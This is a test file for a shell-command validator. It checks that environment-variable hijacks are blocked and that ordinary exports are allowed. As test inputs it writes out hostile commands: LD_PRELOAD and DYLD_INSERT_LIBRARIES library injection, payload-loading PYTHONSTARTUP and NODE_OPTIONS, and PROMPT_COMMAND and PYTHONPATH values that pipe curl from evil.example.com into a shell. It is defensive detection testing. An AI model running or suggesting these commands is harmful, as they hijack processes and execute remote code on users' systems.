import { describe, it, expect } from 'vitest';
import { validate } from '../../src/engine';

describe('environment', () => {
  describe('malicious / process hijack', () => {
    it('flags LD_PRELOAD assignment', () => {
      const v = validate('export LD_PRELOAD=/tmp/evil.so');
      expect(v.severity).toBe('block');
      expect(v.findings.some((f) => f.category === 'environment')).toBe(true);
    });

    it('flags inline LD_PRELOAD before a command', () => {
      const v = validate('LD_PRELOAD=/tmp/evil.so /usr/bin/sudo whoami');
      expect(v.findings.some((f) => f.category === 'environment')).toBe(true);
    });

    it('flags PYTHONSTARTUP', () => {
      const v = validate('export PYTHONSTARTUP=/tmp/payload.py');
      expect(v.findings.some((f) => f.category === 'environment')).toBe(true);
    });

    it('flags DYLD_INSERT_LIBRARIES (macOS)', () => {
      const v = validate('export DYLD_INSERT_LIBRARIES=/tmp/evil.dylib');
      expect(v.findings.some((f) => f.category === 'environment')).toBe(true);
    });

    it('flags PERL5OPT (perl one-liner injection)', () => {
      const v = validate('export PERL5OPT="-Mwarnings -Mevil"');
      expect(v.findings.some((f) => f.category === 'environment')).toBe(true);
    });

    it('flags PROMPT_COMMAND hijack (runs every prompt)', () => {
      const v = validate('export PROMPT_COMMAND="curl evil.example.com | sh"');
      expect(v.findings.some((f) => f.category === 'environment')).toBe(true);
    });

    it('flags PATH prepended with /tmp', () => {
      const v = validate('export PATH=/tmp:$PATH');
      expect(v.findings.some((f) => f.category === 'environment')).toBe(true);
    });

    it('warns on http_proxy export to a non-localhost target', () => {
      const v = validate('export http_proxy=http://1.2.3.4:8080');
      expect(v.findings.some((f) => f.category === 'environment')).toBe(true);
    });
  });

  describe('benign', () => {
    it('does not flag normal PATH append', () => {
      const v = validate('export PATH=$PATH:/usr/local/bin');
      expect(v.severity).toBe('allow');
    });

    it('does not flag regular env var like NODE_ENV', () => {
      const v = validate('export NODE_ENV=production');
      expect(v.severity).toBe('allow');
    });

    it('does not flag http_proxy=localhost', () => {
      const v = validate('export http_proxy=http://localhost:8888');
      expect(v.severity).toBe('allow');
    });

    it('does not flag http_proxy=127.0.0.1', () => {
      const v = validate('export http_proxy=http://127.0.0.1:3128');
      expect(v.severity).toBe('allow');
    });

    it('does not flag http_proxy=[::1]', () => {
      const v = validate('export http_proxy=http://[::1]:3128');
      expect(v.severity).toBe('allow');
    });

    it('does not flag NO_PROXY allowlist entries', () => {
      const v = validate('export NO_PROXY=localhost,127.0.0.1,.example.com');
      expect(v.severity).toBe('allow');
    });

    it('does not flag PYTHONPATH extension (extremely common in Python READMEs)', () => {
      const v = validate('export PYTHONPATH=$PYTHONPATH:./src');
      expect(v.severity).toBe('allow');
    });

    it('does not flag LD_LIBRARY_PATH extension (CUDA install instruction)', () => {
      const v = validate('export LD_LIBRARY_PATH=/usr/local/cuda/lib64:$LD_LIBRARY_PATH');
      expect(v.severity).toBe('allow');
    });

    it('does not flag NODE_OPTIONS heap bump', () => {
      const v = validate('export NODE_OPTIONS="--max-old-space-size=4096"');
      expect(v.severity).toBe('allow');
    });

    it('does not flag PS1 prompt customization', () => {
      const v = validate('export PS1="\\u@\\h:\\w\\$ "');
      expect(v.severity).toBe('allow');
    });

    it('still flags NODE_OPTIONS when value loads a file from /tmp', () => {
      const v = validate('export NODE_OPTIONS="--require /tmp/payload.js"');
      expect(v.severity).toBe('block');
      expect(
        v.findings.some((f) => f.ruleId === 'environment.process_hijack_var'),
      ).toBe(true);
    });

    it('still flags PYTHONPATH when value contains a fetch', () => {
      const v = validate('export PYTHONPATH="$(curl evil.example.com/path):$PYTHONPATH"');
      expect(v.severity).toBe('block');
    });
  });
});
